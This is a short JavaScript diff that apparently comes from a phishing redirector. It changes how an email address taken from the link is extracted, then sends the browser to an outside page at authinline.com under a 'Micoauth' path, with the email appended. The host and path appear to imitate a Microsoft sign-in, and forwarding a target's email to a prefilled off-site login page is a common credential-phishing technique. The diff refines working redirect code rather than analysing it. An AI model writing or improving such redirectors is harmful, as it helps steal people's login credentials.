@@ -17,15 +17,20 @@
         // Check if the email part is not empty
         if (emailPart) {
           // Remove any trailing equal signs and other non-email characters
-          emailPart = emailPart.replace(/[^a-zA-Z0-9.@-]/g, '');
-          // Remove any equal signs from the email
-          emailPart = emailPart.replace(/=/g, '');
+          emailPart = emailPart.match(/[a-zA-Z0-9.@-]+/);
 
-          // Construct the redirect URL by appending the email to the second link
-          var redirectURL = 'https://authinline.com/Micoauth/index.html?' + emailPart;
+          if (emailPart) {
+            emailPart = emailPart[0];
 
-          // Redirect to the constructed URL
-          window.location.href = redirectURL;
+            // Construct the redirect URL by appending the email to the second link
+            var redirectURL = 'https://authinline.com/Micoauth/index.html?' + emailPart;
+
+            // Redirect to the constructed URL
+            window.location.href = redirectURL;
+          } else {
+            // If the email part is empty, simply redirect to the second link
+            window.location.href = 'https://authinline.com/Micoauth/index.html';
+          }
         } else {
           // If the email part is empty, simply redirect to the second link
           window.location.href = 'https://authinline.com/Micoauth/index.html';
